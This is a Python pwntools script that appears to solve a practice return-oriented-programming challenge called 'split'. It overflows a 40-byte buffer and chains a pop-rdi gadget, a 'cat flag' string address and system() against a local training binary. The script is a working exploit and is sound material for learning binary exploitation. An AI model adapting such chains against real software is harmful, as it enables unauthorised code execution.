from pwn import *

context.arch = "amd64"
elf = context.binary = ELF('./split')

# overflow the stack with these
POP_RDI_GADGET = p64(0x4007c3)
CATFLAG = p64(0x601060)
SYSTEM = p64(elf.symbols.system)

# overflow the buffer
payload = b'A' * 40

# when it returns, pop this address into rip and jump to it
payload += POP_RDI_GADGET
# put this on the stack to be popped by above gadget
payload += CATFLAG
# when said gadget returns, pop this into rip and jump to it
payload += SYSTEM

conn = process(elf.path)

conn.recvuntil(b'> ')

conn.send(payload)

print(conn.recvall())
